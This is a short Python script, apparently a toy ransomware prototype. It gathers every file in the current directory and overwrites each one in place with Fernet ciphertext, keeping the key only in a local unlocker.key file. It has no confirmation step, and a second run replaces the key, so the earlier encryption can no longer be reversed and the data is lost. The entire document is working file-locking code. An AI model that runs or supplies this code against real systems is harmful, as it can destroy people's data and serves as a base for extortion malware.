import os
from cryptography.fernet import Fernet

unlock_key = "unlocker.key"

files = []

# Looks through all the files in the current path
# Then saves it in the files list
for file in os.listdir():
    if file == "encrypt.py" or file == unlock_key or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)

# Generates a decryption key
key = Fernet.generate_key()

# Updates the current decrypting key with the new one
# When the script runs again
# Or creates a new .key file
with open(unlock_key, "wb") as unlocker:
    unlocker.write(key)

# Looks through every file in the files list
for file in files:

    # Reads the selected file in the files list
    with open(file, "rb") as selected_file:
        content = selected_file.read()
    
    # Creates an encrypted string
    content_encrypted = Fernet(key).encrypt(content)

    # Writes the encrypted string over any other content in the file
    with open(file, "wb") as selected_file:
        selected_file.write(content_encrypted)
